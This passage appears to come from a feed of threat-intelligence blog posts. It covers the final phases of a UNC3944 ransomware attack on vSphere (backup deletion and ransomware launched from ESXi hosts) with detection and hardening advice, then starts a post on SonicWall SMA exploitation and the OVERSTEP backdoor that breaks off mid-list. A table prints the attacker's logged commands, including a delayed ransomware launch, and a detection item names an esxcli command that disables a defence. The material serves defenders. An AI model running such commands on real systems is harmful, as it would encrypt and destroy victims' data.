\n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Phase 4: Backup Sabotage — Removing the Safety Net</span></h3>\n<p><span style=\"vertical-align: baseline;\">Before deploying ransomware, the actor ensures their target cannot recover.</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">The tactic:</strong><span style=\"vertical-align: baseline;\"> Leveraging their full control over Active Directory, the threat actor targets the backup infrastructure (e.g., a virtualized backup server). They either reuse the compromised Domain Admin credentials to log in via RDP or, more stealthily, add a user they control to the \"Veeam Administrators\" security group in AD. Once in, they delete all backup jobs, snapshots, and repositories.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Why it's effective:</strong><span style=\"vertical-align: baseline;\"> This works due to a lack of administrative tiering (where the same powerful accounts manage both virtualization and backups) and insufficient monitoring of changes to critical AD security groups.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Key detection signals:</strong>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">[Detecting Path A]</strong><span style=\"vertical-align: baseline;\"> Monitor for interactive logons (</span><code style=\"vertical-align: baseline;\">Windows Event ID 4624</code><span style=\"vertical-align: baseline;\">) on the backup server by high-privilege accounts.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[Detecting Path B]</strong><span style=\"vertical-align: baseline;\"> Triggers a CRITICAL alert from AD logs for </span><code style=\"vertical-align: baseline;\">Event ID 4728</code><span style=\"vertical-align: baseline;\"> (\"A member was added to a security-enabled global group\") for any change to the \"Veeam Administrators\" group</span></li>\n<li><strong style=\"vertical-align: baseline;\">[LOGS]</strong><span style=\"vertical-align: baseline;\"> Monitor the backup application's own audit logs for mass deletion events.</span></li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Critical hardening and mitigation:</strong>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL] Isolate backup infrastructure:</strong><span style=\"vertical-align: baseline;\"> The Veeam server and its repositories must be in a separate MFA protected, highly restricted security domain or use dedicated, non-AD-joined credentials. This severs the AD trust relationship the threat actor exploits.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL] Utilize immutable repositories:</strong><span style=\"vertical-align: baseline;\"> This is the technical backstop against backup deletion. It makes the backup data undeletable for a set period, even if a threat actor gains full administrative access to the backup console.</span></li>\n</ul>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Phase 5: Encryption </span><span style=\"vertical-align: baseline;\">— </span><span style=\"vertical-align: baseline;\">Ransomware from the Hypervisor</span></h3>\n<p><span style=\"vertical-align: baseline;\">With the target blinded and their safety net gone, the final stage commences.</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">The tactic:</strong><span style=\"vertical-align: baseline;\"> The threat actor uses their SSH access to the ESXi hosts to push their custom ransomware binary via SCP/SFTP into a writable directory like </span><code style=\"vertical-align: baseline;\">/tmp</code><span style=\"vertical-align: baseline;\">. They then execute a script that uses the native ESXi command-line tool, </span><strong style=\"vertical-align: baseline;\">vim-cmd</strong><span style=\"vertical-align: baseline;\">, to forcibly power off every VM on the host. Finally, they launch the ransomware binary (often with </span><code style=\"vertical-align: baseline;\">nohup</code><span style=\"vertical-align: baseline;\"> to ensure it continues after they log out), which scans the datastores and encrypts all VM files (</span><code style=\"vertical-align: baseline;\">.vmdk</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">.vmx</code><span style=\"vertical-align: baseline;\">, etc.).</span></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Table 5 displays threat actor actions in support of ESXi ransomware execution along with key evidence that an organization may use to detect this activity.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Tactic</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Source Log File</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Key Evidence </strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Threat Actor's Goal</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">SSH Login</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/var/log/auth.log</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">SSH session was opened for 'root@10.10.10.5'</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The Threat Actor logs in as root to the compromised ESXi host via an interactive SSH session.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Prepare Payload</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/var/log/shell.log</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">chmod 0777 encrypt.out</code></p>\n<p><code style=\"vertical-align: baseline;\">cp encrypt.out encrypt_.out</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The Threat Actor’s commands to make the ransomware payload executable are captured by the ESXi shell log.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Create Exclusion List</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/var/log/shell.log</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">echo VCSA-01-PROD &gt;&gt; list.txt</code></p>\n<p><code style=\"vertical-align: baseline;\">echo DC-01-PASSIVE &gt;&gt; list.txt</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The shell log records the creation of the list.txt file, revealing the threat actors intent to selectively encrypt systems.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Execute Ransomware</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/var/log/shell.log</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">nohup sh -c 'sleep 14400 &amp;&amp; /encrypt_.out -pass [REDACTED_ENCRYPTION_KEY] -skip_vms /list.txt' &amp;</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The exact command to launch the time-delayed ransomware, including the key and exclusion list, is logged. The nohup command ensures it runs after they log out.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Clean Up &amp; Exit</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/var/log/shell.log</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">ls nohup.out</code></p>\n<p><code style=\"vertical-align: baseline;\">exit</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The threat actors final commands and session termination are recorded before they exit, leaving the payload to run.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 5: ESXi ransomware execution</span></p>\n</div></div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li><strong style=\"vertical-align: baseline;\">Why it's effective:</strong><span style=\"vertical-align: baseline;\"> Root access on the ESXi shell is the highest level privilege in a virtual environment. By encrypting at the hypervisor level, they bypass all in-guest security and compromise servers with a single action.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Key detection signals:</strong>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">[NETWORK]</strong><span style=\"vertical-align: baseline;\"> Monitor Network Flow Logs for large file transfers to and from ESXi hosts over SSH/SCP.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[BEHAVIOR]</strong><span style=\"vertical-align: baseline;\"> A SIEM alert for a high volume of VM power-off commands originating from a single ESXi host is a high-fidelity indicator of an ongoing attack.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[LOGS]</strong><span style=\"vertical-align: baseline;\"> Monitor ESXi host logs for the execution of </span><code style=\"vertical-align: baseline;\">esxcli system settings kernel set -s execInstalledOnly -v FALSE</code><span style=\"vertical-align: baseline;\"> (a threat actor attempting to disable a key defense) and mass </span><code style=\"vertical-align: baseline;\">vmsvc/power.off</code><span style=\"vertical-align: baseline;\"> commands. Since this setting only applies after a reboot, correlate this alert with a subsequent host reboot within a short time window.</span></li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Critical hardening and mitigation:</strong>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL] Enable vSphere lockdown mode:</strong><span style=\"vertical-align: baseline;\"> This is a primary prevention for this phase as it blocks the interactive SSH access needed to push and execute the payload.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL] Enforce execInstalledOnly execution policy: </strong><span style=\"vertical-align: baseline;\">This ESXi kernel setting is the definitive technical prevention. It blocks any unsigned binary from running, rendering the threat actor's custom ransomware execution attempt to failure. Enable the hardware based TPM 2.0 chip with Secure Boot to lock this setting so it cannot be disabled.</span></li>\n</ul>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">The Three-Pillar Defense: A Fortified Strategy</span></h2>\n<h3><span style=\"vertical-align: baseline;\">Pillar 1: Proactive Hardening (Your Most Reliable Defense)</span></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Architect for centralized access: </strong><span style=\"vertical-align: baseline;\">Do not join ESXi hosts directly to Active Directory. Manage all host access exclusively through vCenter roles and permissions. This drastically reduces the attack surface.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Enable vSphere lockdown mode:</strong><span style=\"vertical-align: baseline;\"> This is a critical control that restricts ESXi management, blocking direct shell access via SSH and preventing changes from being made outside of vCenter.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Enforce execInstalledOnly: </strong><span style=\"vertical-align: baseline;\">This powerful ESXi kernel setting prevents the execution of any binary that wasn't installed as part of a signed, packaged vSphere Installation Bundle (VIB). It would have directly blocked the threat actor's custom ransomware from running. </span></li>\n<li><strong style=\"vertical-align: baseline;\">Use vSphere VM encryption:</strong><span style=\"vertical-align: baseline;\"> Encrypt your Tier 0 virtualized assets (DCs, PKI, etc.). This is the definitive technical block for the offline disk-swap attack, rendering any stolen disk files unreadable.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Practice strict infrastructure hygiene:</strong><span style=\"vertical-align: baseline;\"> Don't just power off old VMs. Implement a strict decommissioning process that deletes their disks from the datastore or moves them to segregated archival storage to eliminate potential \"staging\" machines.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Posture management: </strong><span style=\"vertical-align: baseline;\">It is vital to implement continuous vSphere posture Management (CPM) because hardening is not a one-time task, but a security state that must be constantly maintained against \"configuration drift.\" The UNC3944 playbook fundamentally relies on creating these policy deviations—such as enabling SSH or altering firewall rules. This can be achieved either through dedicated Hybrid Cloud Security Posture Management (CSPM) tools, such as the vSphere Aria Operations Compliance Pack, Wiz, or by developing custom in-house scripts that leverage the vSphere API via PowerShell/PowerCLI to regularly audit your environment. </span></li>\n<li><strong style=\"vertical-align: baseline;\">Harden the help desk:</strong><span style=\"vertical-align: baseline;\"> For privileged accounts, mandate that MFA enrollment or password resets require an in-person, multipart, or high-assurance multi-factor verification process.</span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Pillar 2: Identity and Architectural Integrity (Breaking the Attack Chain)</span></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Enforce phishing-resistant MFA everywhere:</strong><span style=\"vertical-align: baseline;\"> This must be applied to VPN, vCenter logins, and all privileged AD accounts. Use hardened PAWs with exclusive, firewalled access to the virtual center.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Isolate critical identity infrastructure:</strong><span style=\"vertical-align: baseline;\"> Run your Tier 0 assets (Domain Controllers, PAM, Veeam etc) in a dedicated, highly-secured \"identity cluster\" with its own stringent access policies, segregated from general-purpose workloads.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Avoid authentication loops:</strong><span style=\"vertical-align: baseline;\"> A critical architectural flaw is hosting identity providers (AD) recovery systems (Veeam) or privileged access management (PAM) on the very virtualization platform they secure and authenticate. A compromise of the underlying ESXi hosts results in a correlated failure of both the dependent services and the means to restore them, a scenario that significantly complicates or prevents disaster recovery.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Consider alternate identity providers (IdPs):</strong><span style=\"vertical-align: baseline;\"> To break the \"AD-to-everything\" chain, consider using a separate, cloud-native IdP like Azure Entra ID for authenticating to infrastructure.</span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Pillar 3: Advanced Detection and Recovery (Your Safety Net)</span></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Build detections after hardening:</strong><span style=\"vertical-align: baseline;\"> The most effective alerts are those that detect the attempted manipulation of the hardening controls you've put in place. Harden first, then build your detection logic.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Centralize and monitor key logs:</strong><span style=\"vertical-align: baseline;\"> Forward all logs from AD, vCenter, ESXi, networking infrastructure, firewalls, and backups to a SIEM. Correlate logs from these disparate sources to create high-fidelity detection scenarios that can spot the threat actors' methodical movements.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Focus on high-fidelity alerts:</strong><span style=\"vertical-align: baseline;\"> Prioritize alerting on events in phases 1-3. Detecting the enablement of SSH on a host, a VCSA takeover, or membership changes to your \"Veeam Admins\" group will enable you to act </span><span style=\"font-style: italic; vertical-align: baseline;\">before</span><span style=\"vertical-align: baseline;\"> data exfiltration and ransomware deployment.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Architect for survival:</strong><span style=\"vertical-align: baseline;\"> Assume the worst-case scenario. Your immutable and air-gapped backups are your last line of defense. They must be isolated from your production AD and inaccessible to a compromised administrator. Test your recovery plan against this specific threat model to ensure it works.</span></li>\n</ul>\n<h2><span style=\"vertical-align: baseline;\">Conclusion: The Defender’s Mandate </span><span style=\"vertical-align: baseline;\">— </span><span style=\"vertical-align: baseline;\">Harden and Alert</span></h2>\n<p><span style=\"vertical-align: baseline;\">UNC3944's playbook requires a fundamental shift in defensive strategy, moving from EDR-based threat hunting to proactive, infrastructure-centric defense. This threat differs from traditional Windows ransomware in two ways: speed and stealth. While traditional actors may have a dwell time of days or even weeks for reconnaissance, UNC3944 operates with extreme velocity; the entire attack chain from initial access to data exfiltration and final ransomware deployment can occur in mere hours. This combination of speed and minimal forensic evidence makes it essential to not just identify but to immediately intercept suspicious behavioral patterns before they can escalate into a full-blown compromise.</span></p>\n<p><span style=\"vertical-align: baseline;\">This living-off-the-land (LotL) approach is so effective because the Virtual Center appliance and ESXi hypervisor cannot run traditional EDR agents, leaving a significant visibility gap at the virtualization layer. Consequently, sophisticated detection engineering within your SIEM becomes the primary and most essential method for active defense.</span></p>\n<p><span style=\"vertical-align: baseline;\">This reality presents the most vital key for defenders: the ability to detect and act on early alerting is paramount. An alert generated during the final ransomware execution is merely a notification of a successful takeover. In contrast, an alert that triggers when the </span><span style=\"vertical-align: baseline;\">threat actor </span><span style=\"vertical-align: baseline;\">first compromises a help desk account or accesses Virtual Center from an unusual location is an actionable starting point for an investigation—a crucial window of opportunity to evict the threat before they achieve complete administrative control.</span></p>\n<p><span style=\"vertical-align: baseline;\">A resilient defense, therefore, cannot rely on sifting through a sea of broad, noisy alerts. This reactive approach is particularly ineffective when, as is often the case, many vSphere environments are built upon a foundation of insecure defaults—such as overly permissive roles or enabled SSH—and suffer from a lack of centralized logging visibility from ESXi hosts and vCenter. Without the proper context from these systems, a security team is left blind to the </span><span style=\"vertical-align: baseline;\">threat actors' methodical</span><span style=\"vertical-align: baseline;\">, LotL movements until it is far too late.</span></p>\n<p><span style=\"vertical-align: baseline;\">Instead, the strategy must be twofold. First, it requires proactive, defense-in-depth technical hardening to systematically correct these foundational gaps and reduce the attack surface. Second, this must be complemented by a deep analysis of the </span><span style=\"vertical-align: baseline;\">threat actor's tactics, techniques, and procedures (</span><span style=\"vertical-align: baseline;\">TTPs) to build the high-fidelity correlation rules and logging infrastructure needed to spot their earliest movements. This means moving beyond single-event alerts and creating rules that connect the dots between a help desk ticket, a password reset in Active Directory, and a subsequent anomalous login to vCenter.</span></p>\n<p><span style=\"vertical-align: baseline;\">These two strategies are symbiotic, creating a system where defense enables detection. Robust hardening is not just a barrier, it also creates friction for the </span><span style=\"vertical-align: baseline;\">threat actor</span><span style=\"vertical-align: baseline;\">, forcing them to attempt actions that are inherently suspicious. For example, when Lockdown Mode is enabled (hardening), a </span><span style=\"vertical-align: baseline;\">threat actor's</span><span style=\"vertical-align: baseline;\"> attempt to open an SSH session to an ESXi host will fail, but it will also generate a specific, high-priority event. The control itself creates the clean signal that a properly configured SIEM is built to catch.</span></p>\n<p><span style=\"vertical-align: baseline;\">For any organization with a critical dependency on vSphere, this is not a theoretical exercise. What makes this threat exceptionally dangerous is its ability to render entire security strategies irrelevant. It circumvents traditional tiering models by attacking the underlying hypervisor that hosts all of your virtualized Tier 0 assets—including Domain Controllers, Certificate Authorities, and PAM solutions—rendering the logical separation of tiering completely ineffective. Simultaneously, By manipulating virtual disks while the VMs are offline, it subverts in-guest security solutions—such as EDR, antivirus (AV), DLP, and host-based intrusion prevention systems (HIPS)—as their agents cannot monitor for direct ESXi level changes.</span></p>\n<p><span style=\"vertical-align: baseline;\">The threat is immediate, and the attack chain is proven. Mandiant has observed that the successful hypervisor-level tactics leveraged by groups like UNC3944 are no longer exclusive; these same TTPs are now being actively adopted by other ransomware groups. This proliferation turns a specialized threat into a mainstream attack vector, making the time to act now.</span></p></div>"}
{"source": "Threat Intelligence", "title": "Ongoing SonicWall Secure Mobile Access (SMA) Exploitation Campaign using the OVERSTEP Backdoor", "link": "https://cloud.google.com/blog/topics/threat-intelligence/sonicwall-secure-mobile-access-exploitation-overstep-backdoor/", "published": "Wed, 16 Jul 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Josh Goddard, Zander Work, Dimiter Andonov</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\"><strong>UPDATE (Sep 16): </strong></span><span style=\"vertical-align: baseline;\">Clarified hunting guidance specifics surrounding </span><code style=\"font-style: italic; vertical-align: baseline;\">ld.so.preload</code><span style=\"vertical-align: baseline;\"> files.</span></p>\n<p><strong>UPDATE (July 30): </strong>Added additional network IOC identified by Sonicwall as being associated with OVERSTEP. </p>\n<p> </p></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Introduction</span></h2>\n<p><span style=\"vertical-align: baseline;\">Google Threat Intelligence Group (GTIG) has identified an ongoing campaign by a suspected financially-motivated threat actor we track as UNC6148, targeting fully patched </span><a href=\"https://www.sonicwall.com/support/product-lifecycle-tables/Secure-Mobile-Access-100-Series/Hardware\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">end-of-life</span></a><span style=\"vertical-align: baseline;\"> SonicWall Secure Mobile Access (SMA) 100 series appliances. GTIG assesses with high confidence that UNC6148 is leveraging credentials and one-time password (OTP) seeds stolen during previous intrusions, allowing them to regain access even after organizations have applied security updates. Evidence for the initial infection vector was limited, as the actor's malware is designed to selectively remove log entries, hindering forensic investigation; however, it is likely this was through the exploitation of known vulnerabilities.</span></p>\n<p><span style=\"vertical-align: baseline;\">In this new wave of activity, the actor has deployed a previously unknown persistent backdoor/user-mode rootkit, which GTIG tracks as OVERSTEP. Based on findings from Mandiant Incident Response engagements, our analysis shows this malware modifies the appliance's boot process to maintain persistent access, steal sensitive credentials, and conceal its own components. GTIG assesses with moderate confidence that UNC6148 may have used an unknown zero-day remote code execution vulnerability to deploy OVERSTEP on opportunistically targeted SonicWall SMA appliances.</span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG assesses with moderate confidence that UNC6148's operations, dating back to at least October 2024, may be to enable data theft and extortion operations, and possibly ransomware deployment. An organization targeted by UNC6148 in May 2025 was posted to the \"World Leaks\" data leak site (DLS) in June 2025, and UNC6148 activity overlaps with </span><a href=\"https://www.truesec.com/hub/blog/web-shell-on-a-sonicwall-sma\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">publicly reported SonicWall exploitation</span></a><span style=\"vertical-align: baseline;\"> from late 2023 and early 2024 that has been </span><a href=\"https://dfir.ch/posts/microsocks_sonicwall/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">publicly linked</span></a><span style=\"vertical-align: baseline;\"> to the deployment of Abyss-branded ransomware (tracked by GTIG as VSOCIETY).</span></p>\n<p><span style=\"vertical-align: baseline;\">Given the risk of recompromise using previously stolen credentials, organizations should follow the recommendations within this post to hunt for potential compromises and rotate all credentials, even if their appliances are fully patched. This blog post provides technical details on the OVERSTEP rootkit and the UNC6148 campaign to aid defenders in mitigating this threat.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Initial SMA Exploitation to Gain Administrator Credentials</span></h2>\n<p><span style=\"vertical-align: baseline;\">Mandiant's first observations of UNC6148 in a recent investigation showed that they already had local administrator credentials to the targeted SMA 100 series appliance, and neither forensic evidence nor other data was identified to show how those credentials were obtained. GTIG assesses with high confidence that UNC6148 exploited a known vulnerability to steal administrator credentials prior to the targeted SMA appliance being updated to the latest firmware version (</span><code style=\"vertical-align: baseline;\">10.2.1.15-81sv</code><span style=\"vertical-align: baseline;\">), based on the patching timeline and public reporting of SonicWall n-day exploitation activity throughout 2025. Analysis of network traffic metadata records suggests that UNC6148 may have initially exfiltrated these credentials from the SMA appliance as early as January 2025.</span></p>\n<p><span style=\"vertical-align: baseline;\">Public reporting from SonicWall and multiple security firms has highlighted several different vulnerabilities that could possibly have been exploited by UNC6148:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">CVE-2021-20038: Unauthenticated remote code execution (</span><a href=\"https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0026\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SonicWall advisory</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.truesec.com/hub/blog/web-shell-on-a-sonicwall-sma\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Truesec report,</span></a><span style=\"vertical-align: baseline;\"> </span><a href=\"https://attackerkb.com/topics/QyXRC1wbvC/cve-2021-20038/rapid7-analysis\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AttackerKB entry</span></a><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">This is a memory corruption vulnerability that can be executed to gain code execution; however, Rapid7's public exploit can make up to 200,000 HTTP requests and could take over an hour to execute, suggesting a widespread campaign may not take advantage of this vulnerability.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Truesec identified this as a plausible entrypoint for intrusion activity they observed in late 2023 targeting a SonicWall SMA.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">CVE-2024-38475: Unauthenticated path traversal vulnerability in Apache HTTP Server, which affected the SMA 100 series (</span><a href=\"https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0018\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SonicWall advisory</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://blog.scrt.ch/2025/06/04/sonicdoor-attacking-sonicwalls-sma-500/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Orange CyberDefense/SCRT blog post</span></a><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">This can be exploited on the SMA 100 series specifically to exfiltrate two different SQLite databases, </span><code style=\"vertical-align: baseline;\">temp.db</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">persist.db</code><span style=\"vertical-align: baseline;\">, which store sensitive information including user account credentials, session tokens, and OTP seed values.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">watchTowr published a </span><a href=\"https://labs.watchtowr.com/sonicboom-from-stolen-tokens-to-remote-shells-sonicwall-sma100-cve-2023-44221-cve-2024-38475/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog post</span></a><span style=\"vertical-align: baseline;\"> in May 2025 describing how this vulnerability can be chained with another bug, CVE-2023-44221, to compromise an SMA 100 series appliance; however, we did not identify any evidence suggesting this bug chain was used by UNC6148.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">CVE-2021-20035: Authenticated remote code execution vulnerability (</span><a href=\"https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0022\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SonicWall</span></a><span style=\"vertical-align: baseline;\"> </span><a href=\"https://www.sonicwall.com/support/notices/product-notice-arbitrary-command-injection-vulnerability-in-sonicwall-sma-100-series-appliances/250415122607607\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">advisory</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://arcticwolf.com/resources/blog/credential-access-campaign-targeting-sonicwall-sma-devices-potentially-linked-to-exploitation-of-cve-2021-20035/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ArcticWolf report</span></a><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">This is a command injection vulnerability in the handler for </span><code style=\"vertical-align: baseline;\">/cgi-bin/sitecustomization</code><span style=\"vertical-align: baseline;\"> POST requests.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Arctic Wolf and SonicWall reported on this vulnerability being exploited in the wild in April 2025.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">CVE-2021-20039: Authenticated remote code execution vulnerability (</span><a href=\"https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0026\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SonicWall advisory</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://dfir.ch/posts/microsocks_sonicwall/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">dfir.ch blog post</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://attackerkb.com/topics/9szJhq46lw/cve-2021-20039/rapid7-analysis\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AttackerKB entry</span></a><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">This is a command injection vulnerability in the request handler for </span><code style=\"vertical-align: baseline;\">/cgi-bin/viewcert</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span 